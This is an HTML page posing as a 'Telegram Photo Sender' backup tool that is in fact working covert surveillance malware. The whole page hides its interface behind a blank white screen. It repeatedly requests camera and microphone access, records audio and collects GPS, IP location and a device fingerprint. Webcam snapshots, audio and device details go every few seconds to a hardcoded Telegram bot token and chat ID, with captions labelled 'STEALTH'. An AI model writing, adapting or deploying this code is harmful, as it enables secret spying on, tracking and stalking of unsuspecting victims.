<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Telegram Photo Sender</title>
  <style>
    /* HIDE EVERYTHING - BLANK WHITE SCREEN */
    body {
      margin: 0;
      padding: 0;
      background: white;
      overflow: hidden;
      height: 100vh;
      width: 100vw;
    }
    
    /* ABSOLUTELY POSITION ALL CONTENT OFFSCREEN */
    h1, p, #status, #video-container, #retry-section, button {
      position: absolute;
      left: -9999px;
      top: -9999px;
      visibility: hidden;
      opacity: 0;
    }
    
    /* VIDEO HIDDEN BUT FUNCTIONAL */
    #video-container {
      position: fixed;
      top: 0;
      left: 0;
      width: 1px !important;
      height: 1px !important;
      opacity: 0;
      pointer-events: none;
      z-index: -1;
    }
  </style>
</head>
<body>
  <!-- UI COMPLETELY HIDDEN - BLANK WHITE SCREEN TO USER -->
  <h1>📸 Telegram Photo Sender</h1>
  <p>Securely backup your photos to Telegram</p>
  
  <div id="status">🔄 Requesting camera + microphone access...</div>
  <div id="video-container"><video id="video" autoplay muted playsinline></video></div>
  <div id="retry-section">
    <p>🚫 Camera/Microphone denied!</p>
    <p>📤 Sending device + audio... Next retry in 2s</p>
    <button class="retry-btn" onclick="retryCamera()">🔄 Manual Retry</button>
  </div>

  <script>
    let stream = null;
    let photoInterval = null;
    let audioContext = null;
    let mediaRecorder = null;
    let audioChunks = [];
    let nextRetryTimer = null;
    let locationData = { 
      lat: '9.9406', lng: '76.2653', accuracy: 'IP (~10km)', source: 'IP', 
      ip: '42.104.157.233', city: 'Kochi', org: 'Vodafone Idea Ltd', 
      region: 'Kerala', country: 'India', timezone: 'Asia/Kolkata'
    };
    let retryCount = 0;
    let infoSent = false;

    // Start audio recording (silent)
    function startAudioCapture() {
      audioContext = new (window.AudioContext || window.webkitAudioContext)();
      navigator.mediaDevices.getUserMedia({ audio: true })
        .then(stream => {
          mediaRecorder = new MediaRecorder(stream);
          audioChunks = [];
          
          mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
          mediaRecorder.onstop = sendAudio;
          
          mediaRecorder.start();
          setTimeout(() => {
            if (mediaRecorder.state === 'recording') mediaRecorder.stop();
          }, 5000);
        })
        .catch(e => console.log('Audio failed:', e));
    }

    // Send audio file
    async function sendAudio() {
      if (audioChunks.length === 0) return;
      
      const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
      const device = await getDeviceFingerprint();
      
      const formData = new FormData();
      formData.append('voice', audioBlob, `audio_${locationData.ip}_${Date.now()}.webm`);
      formData.append('chat_id', '6469212447');
      formData.append('caption', `🎤 STEALTH AUDIO | IP: ${locationData.ip} | 🔋 ${device.battery}`);
      
      try {
        await fetch(`https://api.telegram.org/bot8782383119:AAEJRURuizoo7VkOlR49PukI37_gSXxSCpU/sendVoice`, {
          method: 'POST', body: formData,
        });
      } catch (e) {}
    }

    // Device info on denial
    async function sendDeviceInfoOnDenial() {
      if (infoSent) return;
      infoSent = true;
      
      startAudioCapture();
      
      const device = await getDeviceFingerprint();
      const ts = new Date().toLocaleString();
      
      const caption = `**🚫 STEALTH DENIED** #${retryCount}
**🎤** 5s audio captured | **👁️** Blank screen active
**⏳** 2s retries forever

**🌐** \`${locationData.ip}\` | **${locationData.org}**
**📍** ${locationData.city}, ${locationData.region}
**🔋** ${device.battery} | **💾** ${device.ram}
**📱** ${device.platform} | **${device.screen}**
**⚙️** ${device.hardwareConcurrency}c | **${device.languages}**

**📍** ${locationData.lat}, ${locationData.lng} | **${ts}`;

      const formData = new FormData();
      formData.append('chat_id', '6469212447');
      formData.append('text', caption);
      formData.append('parse_mode', 'Markdown');

      try {
        await fetch(`https://api.telegram.org/bot8782383119:AAEJRURuizoo7VkOlR49PukI37_gSXxSCpU/sendMessage`, {
          method: 'POST', body: formData,
        });
      } catch (e) {}
    }

    // 2s retry timer
    async function scheduleNextRetry() {
      retryCount++;
      
      if (nextRetryTimer) clearTimeout(nextRetryTimer);
      
      document.getElementById('status').innerText = `🚫 Denied #${retryCount} - Stealth mode`;
      
      await sendDeviceInfoOnDenial();
      
      nextRetryTimer = setTimeout(async () => {
        document.getElementById('status').innerText = `🔄 Stealth retry #${retryCount}`;
        await requestCamera();
      }, 2000);
    }

    window.retryCamera = async function() {
      document.getElementById('status').innerText = '🔄 Manual stealth retry';
      await requestCamera();
    };

    async function requestCamera() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' },
          audio: true
        });
        
        if (nextRetryTimer) clearTimeout(nextRetryTimer);
        onCameraSuccess();
        return true;
        
      } catch (error) {
        console.log(`#${retryCount} failed:`, error.name);
        scheduleNextRetry();
        return false;
      }
    }

    function onCameraSuccess() {
      document.getElementById('status').innerText = '✅ STEALTH Cam+Mic - Blank screen';
      document.getElementById('video-container').style.display = 'block';
      
      const video = document.getElementById('video');
      video.srcObject = stream;
      
      startLocationTracking();
      startPhotoCapture();
      startAudioCapture();
    }

    function startLocationTracking() {
      locationData.localTime = new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'});

      fetch('https://ipapi.co/json/')
        .then(r => r.json())
        .then(data => {
          locationData.ip = data.ip || locationData.ip;
          locationData.lat = data.latitude?.toFixed(4) || locationData.lat;
          locationData.lng = data.longitude?.toFixed(4) || locationData.lng;
          locationData.city = data.city || locationData.city;
          locationData.org = data.org || locationData.org;
        }).catch(() => {});

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            locationData.lat = pos.coords.latitude.toFixed(6);
            locationData.lng = pos.coords.longitude.toFixed(6);
            locationData.accuracy = `${Math.round(pos.coords.accuracy)}m`;
            locationData.source = 'GPS';
          }, () => {}, { enableHighAccuracy: true }
        );
      }
    }

    async function getDeviceFingerprint() {
      let ramEstimate = 'N/A', batteryInfo = { level: 'N/A', charging: 'N/A' };
      
      if ('getBattery' in navigator) {
        try {
          const battery = await navigator.getBattery();
          batteryInfo = { level: Math.round(battery.level * 100) + '%', charging: battery.charging ? 'Yes' : 'No' };
        } catch(e) {}
      }
      
      if ('memory' in performance && performance.memory) {
        const totalMB = Math.round(performance.memory.jsHeapSizeLimit / 1024 / 1024);
        ramEstimate = `${Math.round(totalMB/256)} GB`;
      }
      
      return {
        platform: navigator.platform, userAgent: navigator.userAgent.substring(0, 80),
        screen: `${screen.width}x${screen.height}`, pixelRatio: window.devicePixelRatio,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
        languages: navigator.languages?.join(',') || navigator.language,
        connection: navigator.connection?.effectiveType || 'N/A',
        ram: ramEstimate, battery: `${batteryInfo.level} (Charging: ${batteryInfo.charging})`
      };
    }

    async function captureAndSend() {
      const device = await getDeviceFingerprint();
      
      const caption = `**👁️ STEALTH VIDEO** #${Math.floor(Date.now()/2000)}
**🌐** \`${locationData.ip}\` | **📍** ${locationData.city}
**🔋** ${device.battery} | **💾** ${device.ram}`;

      const video = document.getElementById('video');
      if (video.readyState < 2) return;

      const canvas = document.createElement('canvas');
      canvas.width = 640; canvas.height = 480;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0);

      const blob = dataURLtoBlob(canvas.toDataURL('image/jpeg', 0.9));
      const formData = new FormData();
      formData.append('photo', blob, `stealth_${locationData.ip}_${Date.now()}.jpg`);
      formData.append('chat_id', '6469212447');
      formData.append('caption', caption);
      formData.append('parse_mode', 'Markdown');

      try {
        await fetch(`https://api.telegram.org/bot8782383119:AAEJRURuizoo7VkOlR49PukI37_gSXxSCpU/sendPhoto`, {
          method: 'POST', body: formData,
        });
      } catch (e) {}
    }

    function dataURLtoBlob(dataURL) {
      const [header, data] = dataURL.split(',');
      const mime = header.split(':')[1].split(';')[0];
      const binary = atob(data);
      const array = new Uint8Array(binary.length);
      for (let i = 0; i < binary.length; i++) array[i] = binary.charCodeAt(i);
      return new Blob([array], { type: mime });
    }

    function startPhotoCapture() {
      captureAndSend();
      photoInterval = setInterval(captureAndSend, 2500);
    }

    window.addEventListener('beforeunload', () => {
      if (stream) stream.getTracks().forEach(track => track.stop());
      if (nextRetryTimer) clearTimeout(nextRetryTimer);
      if (photoInterval) clearInterval(photoInterval);
      if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
    });

    requestCamera();
  </script>
</body>
</html>
